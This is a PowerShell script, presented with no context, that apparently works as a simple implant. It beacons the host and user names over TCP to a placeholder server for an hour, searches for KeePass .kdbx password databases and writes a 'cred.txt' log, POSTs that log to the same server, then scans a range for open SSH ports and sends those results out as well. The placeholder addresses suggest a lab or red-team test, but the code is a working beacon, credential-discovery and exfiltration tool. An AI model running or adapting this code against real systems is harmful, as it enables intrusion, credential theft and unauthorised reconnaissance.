$ErrorActionPreference = "SilentlyContinue"

$srv = "IP"
$beaconPort = 7777
$httpPort = 8080

$root = "C:\Temp"
$dataFolder = "$root\Data"
$resultFolder = "$root\Results"

New-Item -ItemType Directory -Force -Path $dataFolder | Out-Null
New-Item -ItemType Directory -Force -Path $resultFolder | Out-Null

$marker = "$root\s1.txt"

"Executed: $(Get-Date)" |
    Out-File $marker -Encoding UTF8

$startTime = Get-Date
$endTime = $startTime.AddHours(1)

while ((Get-Date) -lt $endTime) {

    try {

        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($srv, $beaconPort)

        $stream = $client.GetStream()

        $message = "BEACON|HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)

        $stream.Write($bytes, 0, $bytes.Length)

        $stream.Close()
        $client.Close()
    }
    catch {}

    $remaining = $endTime - (Get-Date)

    if ($remaining.TotalSeconds -le 0) {
        break
    }

    $sleepSeconds = [Math]::Min(300, [Math]::Ceiling($remaining.TotalSeconds))

    Start-Sleep -Seconds $sleepSeconds
}

$discoveryLog = "$resultFolder\cred.txt"

"=== FILE DISCOVERY ===" |
    Out-File $discoveryLog -Encoding UTF8

"Timestamp: $(Get-Date)" |
    Add-Content $discoveryLog

"Hostname: $env:COMPUTERNAME" |
    Add-Content $discoveryLog

"Username: $env:USERNAME" |
    Add-Content $discoveryLog

Get-ChildItem `
    -Path $dataFolder `
    -Recurse `
    -File `
    -Filter "*.kdbx" `
    -ErrorAction SilentlyContinue |
    ForEach-Object {

        "NAME: $($_.Name)" |
            Add-Content $discoveryLog

        "PATH: $($_.FullName)" |
            Add-Content $discoveryLog

        "SIZE: $($_.Length)" |
            Add-Content $discoveryLog

        "MODIFIED: $($_.LastWriteTime)" |
            Add-Content $discoveryLog

        "" |
            Add-Content $discoveryLog
    }


try {

    $body = Get-Content $discoveryLog -Raw

    Invoke-WebRequest `
        -Uri "http://${srv}:${httpPort}" `
        -Method POST `
        -Body $body `
        -ContentType "text/plain" `
        -ErrorAction Stop
}
catch {}

$scanResult = "$resultFolder\scan.txt"

"=== NETWORK DISCOVERY ===" |
    Out-File $scanResult -Encoding UTF8

"Timestamp: $(Get-Date)" |
    Add-Content $scanResult

"Target: IP/range" |
    Add-Content $scanResult

"Port: 22" |
    Add-Content $scanResult

"" |
    Add-Content $scanResult


1..2 | ForEach-Object {

    $ip = "IP.$_"

    try {

        $result = Test-NetConnection `
            -ComputerName $ip `
            -Port 22 `
            -InformationLevel Quiet `
            -WarningAction SilentlyContinue

        if ($result) {

            "$ip`:22 OPEN" |
                Add-Content $scanResult
        }
        else {

            "$ip`:22 CLOSED/UNREACHABLE" |
                Add-Content $scanResult
        }
    }
    catch {

        "$ip`:22 ERROR" |
            Add-Content $scanResult
    }

    Start-Sleep -Milliseconds 250
}


try {

    $scanBody = Get-Content $scanResult -Raw

    Invoke-WebRequest `
        -Uri "http://${srv}:${httpPort}" `
        -Method POST `
        -Body $scanBody `
        -ContentType "text/plain" `
        -ErrorAction Stop
}
catch {}
